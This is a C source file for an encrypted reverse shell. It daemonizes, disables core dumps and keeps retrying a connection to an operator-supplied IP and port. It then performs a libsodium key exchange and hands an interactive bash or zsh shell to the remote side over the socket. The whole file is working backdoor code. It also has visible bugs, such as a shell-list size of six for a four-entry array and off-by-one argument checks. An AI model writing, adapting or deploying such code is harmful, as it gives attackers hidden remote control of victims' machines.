
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

#include <arpa/inet.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <spawn.h>
#include <unistd.h>

#include <sodium.h>

#include "misc.h"
#include "../../cryptwrapper/include/wrapper.h"

#define IP_LEN 16

bool brexit = false;

struct connection {
	char ip[IP_LEN];
	uint16_t port;

	struct sockaddr_in sin;
	int sock;
	struct crypto_ctx ctx;

	// shell fds
	int procin[2];
	int procout[2];

	int relayrv;
	bool exit;
};

int setupcon(struct connection *con)
{
	con->sock = socket(PF_INET, SOCK_STREAM, 0);
	if (con->sock < 0) {
		return -1;
	}

	// setup input pipe
	if (pipe(con->procin)) {
		return -2;
	}

	if (fcntl(con->procin[0], F_SETFL, O_NONBLOCK)) {
		return -3;
	}

	if (fcntl(con->procin[1], F_SETFL, O_NONBLOCK)) {
		return -4;
	}

	// setup output pipe
	if (pipe(con->procout)) {
		return -5;
	}

	if (fcntl(con->procout[0], F_SETFL, O_NONBLOCK)) {
		return -6;
	}
	if (fcntl(con->procout[1], F_SETFL, O_NONBLOCK)) {
		return -7;
	}

	// set keepalive
	{
		int var = 1;
		socklen_t len = sizeof var;

		if (setsockopt(con->sock, SOL_SOCKET, SO_KEEPALIVE, &var,
			       len)) {
			return 9;
		}
	}

	con->relayrv = 0;
	con->exit = false;

	con->sin.sin_family = AF_INET;
	con->sin.sin_port = htons(con->port);
	con->sin.sin_addr.s_addr = inet_addr(con->ip);

	return 0;
}

int closecon(struct connection *con)
{
	if (closepipe(con->procin)) {
		return -1;
	}

	if (closepipe(con->procout)) {
		return -2;
	}

	if (close(con->sock)) {
		return -3;
	}
	return 0;
}

void *relay(void *data)
{
	int len;
	struct connection *con = (struct connection *)data;

	unsigned char buff[TRANS_BUFF_SIZE];

	con->relayrv = 0;

	if (fcntl(con->sock, F_SETFL, O_NONBLOCK)) {
		con->relayrv = 1;
		return NULL;
	}

	while (!con->exit) {
		memset(buff, 0, TRANS_BUFF_SIZE);

		// decrypt incomming cipher into buff
		len = recv_encrypted(con->sock, &con->ctx, buff);
		if (len > 0) {
			// if buffer is not empty write to pipe
			len = write(con->procin[1], buff, TRANS_BUFF_SIZE);
			if (len < 0) {
				con->relayrv = -2;
				return NULL;
			}
			dbprintf("written:%s\n", buff);

		} else if (len < 0) {
			dbprintf("recv_encrypted failed with %d!\n", len);
		}

		memset(buff, 0, TRANS_BUFF_SIZE);

		// read from pipe
		len = read(con->procout[0], buff, TRANS_BUFF_SIZE);
		if (len < 0 && errno != EWOULDBLOCK && errno != EAGAIN) {
			con->relayrv = -3;
			return NULL;
		}

		if (len > 0) {
			if (send_encrypted(con->sock, &con->ctx, buff) < 0) {
				dbprintf("send_encrypted failed with %d!\n",
					 len);
			}
		}

		if (usleep(25000)) {
			con->relayrv = -4;
			return NULL;
		}
	}
	return NULL;
}

int spawnconsole(struct connection *con)
{
	int rv;
	size_t i;

	char *shells[] = { "/bin/bash", "/usr/bin/bash", "/bin/zsh",
			   "/usr/bin/zsh" };

	const size_t shells_size = 6;

	// Search for a working shell
	dbprint("Searching for shells...\n");
	for (i = 0; i < shells_size; i++) {
		if (access(shells[i], F_OK) == 0) {
			dbprintf("Found shell %s!\n", shells[i]);
			break;
		}
		dbprintf("Shell %s no good...\n", shells[i]);
	}

	if (i == shells_size) {
		dbprint("No shell found!\n");
		return -1;
	}

	{
		pthread_t thread;
		pid_t pid;
		char *argv[] = { shells[i], "-i", NULL };

		pid = fork();
		if (pid == 0) {
			// As child
			dbprint("Closing unneeded fds...\n");
			if (close(con->procout[0]) | close(con->procin[1])) {
				return -1;
			}

			dbprint("Dupping i/o fds...\n");
			if (dup2(con->procin[0], STDIN_FILENO) < 0) {
				return -2;
			}

			if (dup2(con->procout[1], STDOUT_FILENO) < 0) {
				return -3;
			}

			if (dup2(con->procout[1], STDERR_FILENO) < 0) {
				return -4;
			}

			dbprint("Forking shell...\n");
			if (execv(shells[i], argv) < 0) {
				return -5;
			}

		} else if (pid < 0) {
			// On error
			return -7;
		}

		// Close unneeded fd's
		if (close(con->procout[1]) || close(con->procin[0])) {
			return -8;
		}

		// Create relay thread
		con->exit = false;
		if (pthread_create(&thread, NULL, relay, con)) {
			return -9;
		}
		dbprint("Created relay thread!\n");

		// Wait for shell to exit
		while (1) {
			if (con->exit) {
				// Try to kill the process
				if (kill(pid, SIGKILL)) {
					dbprint("Killing shell failed!\n");
					return -10;
				}
				dbprint("Killed shell!\n");
			}

			if (waitpid(pid, &rv, WNOHANG) >= 0) {
				if (WIFEXITED(rv)) {
					dbprintf("Shell process returned %d\n",
						 WEXITSTATUS(rv));
					break;
				}
			} else {
				return -11;
			}

			sleep(1);
		}

		con->exit = true;
		if (pthread_join(thread, NULL)) {
			return -12;
		}
		dbprintf("Relay thread returned %d\n", con->relayrv);
	}
	return 0;
}

static long int longparse(const char input[], char **end)
{
	long int num;
	errno = 0;

	num = strtol(input, end, 0);
	if (end != NULL) {
		if (*end == input) {
			return LLONG_MAX;
		}
	}

	if ((num == LLONG_MAX || num == LLONG_MIN) && errno == ERANGE) {
		return LLONG_MAX;
	}

	return num;
}

int argparse(int argc, char *argv[], struct connection *con)
{
	int i;

	con->port = 0;
	con->ip[0] = '\0';

	for (i = 0; i < argc; i++) {
		switch (argv[i][1]) {
		case 'i':
			if (i + 1 <= argc) {
				memcpy(con->ip, argv[i + 1], IP_LEN);
			} else {
				dbprint("Invalid IP Address given!\n");
			}
			break;

		case 'p':
			if (i + 1 <= argc) {
				long int temp;

				temp = longparse(argv[i + 1], NULL);
				if (temp > UINT16_MAX || temp < 1) {
					dbprint("Invalid argument given to -p option\n");
					return 1;
				} else {
					con->port = temp;
				}
			}
			break;
		}
	}

	if (con->port == 0 || con->ip[0] == '\0') {
		dbprint("Invalid argument provided!\n[ -p <port> -i <remote_IP> ]\n");
		return 1;
	}
	return 0;
}

int main(int argc, char *argv[])
{
	int rv;

	struct connection con;

	if (sodium_init()) {
		return -1;
	}

	// set coredump limit
	{
		struct rlimit limit;
		limit.rlim_cur = 0;
		limit.rlim_max = 0;

		if (setrlimit(RLIMIT_CORE, &limit)) {
			dbprint("setrlimit\n");
			return -2;
		}
	}

	rv = argparse(argc, argv, &con);
	if (rv) {
		dbprintf("argparse:%d\n", rv);
		return -4;
	}

	// fork off like a daemon
#ifndef DEBUG
	rv = forkoff();
	if (rv) {
		dbprintf("forkoff: %d\n", rv);
		return -5;
	}
#endif

	// main loop
	{
		while (!brexit) {
			// setup a connection
			rv = setupcon(&con);
			if (rv) {
				dbprintf("setupcon:%d\n", rv);
				return -6;
			}

			// try to connect
			dbprintf("Connecting to %s:%d\n", con.ip, con.port);
			rv = 1;
			while (rv) {
				rv = connect(con.sock,
					     (struct sockaddr *)&con.sin,
					     sizeof(con.sin));
				if (rv && errno != ECONNREFUSED &&
				    errno != EINPROGRESS) {
					dbprintf("connect: %s\n",
						 strerror(errno));
					return -7;
				}
				sleep(1);
			}
			dbprint("Connected!\n");

			// keyexchange between client and server
			rv = keyexchange(con.sock, &con.ctx, true);
			if (rv) {
				dbprintf("keyexchange:%d\n", rv);
				return -9;
			}
			dbprint("Authentication complete!\n");

			// spawn console / dups fds so that shell is usable over the sock
			rv = spawnconsole(&con);
			if (rv) {
				dbprintf("spawnconsole:%d\n", rv);
				return -10;
			}

			// close connection
			rv = closecon(&con);
			if (rv) {
				dbprintf("closecon:%d\n", rv);
				return -11;
			}
		}

		dbprint("Exiting!\n");
	}
	return 0;
}
